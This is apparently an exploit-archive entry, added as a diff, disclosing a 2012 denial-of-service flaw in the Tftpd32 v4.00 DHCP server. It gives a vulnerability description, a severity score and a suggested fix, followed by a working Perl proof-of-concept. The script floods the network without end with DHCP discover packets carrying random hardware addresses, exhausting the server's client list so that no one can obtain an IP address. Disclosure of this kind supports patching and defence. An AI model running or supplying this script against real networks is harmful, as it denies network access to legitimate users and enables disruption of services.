@@ -1,0 +1,84 @@
+id: 18342
+date: 05/23/2012
+title: Tftpd32 DHCP Serve 4.00 Denial Of Service
+author: demonalex
+cves: 
+
+Title: Tftpd32 DHCP Server Denial Of Service Vulnerability
+Software : Tftpd32
+
+Software Version : v4.00
+
+Vendor: http://tftpd32.jounin.net/ 
+
+Vulnerability Published : 2012-05-21
+
+Vulnerability Update Time :
+
+Status : 
+
+Impact : Medium(CVSS2 Base : 5.0, AV:N/AC:L/Au:N/C:N/I:N/A:P)
+
+Bug Description :
+Tftpd32 is a free tftp and dhcp server for windows, freeware tftp server.
+The tftpd32's dhcp server does not identify whether the real source mac address of dhcp discover packet is the same as client hardware address in payload of 
+
+dhcp discover packet, so that attacker can makes evil dhcp discover packets to cram dhcp client list of the dhcp server, and then no one can gain ip address 
+
+from the dhcp server.
+
+Solution :
+Like the other dhcp server, the tftpd32's dhcp server can drop the dhcp discover packet when it was detected the different between source mac address of dhcp 
+
+discover packet and client hardware address in payload of dhcp discover packet.
+
+Proof Of Concept :
+-----------------------------------------------------------
+#!/usr/bin/perl
+use IO::Socket::INET;
+use Net::DHCP::Packet;
+use Net::DHCP::Constants;
+$a=1;
+while(1){
+  print "\Request Number : $a\n";
+
+      $mac=int(rand(9)).int(rand(9)).int(rand(9)).int(rand(9)).int(rand(9)).int(rand(9)).
+  int(rand(9)).int(rand(9)).int(rand(9)).int(rand(9)).int(rand(9)).int(rand(9));
+
+      $socket = IO::Socket::INET->new( Proto => 'udp',
+      Broadcast => 1,
+      LocalPort => 68,
+      PeerAddr =>'255.255.255.255',
+      PeerPort => 67,
+      ) || die "Unable to create socket: $@\n";
+    
+      $discover = Net::DHCP::Packet->new(
+      xid => int rand(0xFFFFFFFF),
+      Chaddr => $mac,
+      DHO_DHCP_MESSAGE_TYPE() => DHCPDISCOVER(),
+      DHO_VENDOR_CLASS_IDENTIFIER() => 'MyVendorClassID',
+      DHO_DHCP_PARAMETER_REQUEST_LIST() => '1 2 6 12 15 28 67');
+
+      $discover->addOptionRaw( 61, pack('H*',$mac));
+    
+      print "Sending DISCOVER to 255.255.255.255:67\n";
+    
+      $socket->send( $discover->serialize() ) or die "Unable to send Discover:$!\n";
+    
+      $socket->close();
+    
+      sleep(3);
+
+      $a++;
+}
+exit(1);
+-----------------------------------------------------------
+
+Credits : This vulnerability was discovered by demonalex(at)163(dot)com
+mail: demonalex(at)163(dot)com / ChaoYi.Huang@connect.polyu.hk
+Pentester/Researcher
+Dark2S Security Team/PolyU.HK
+
+
+
+#  0day.today [2023-03-25]  #
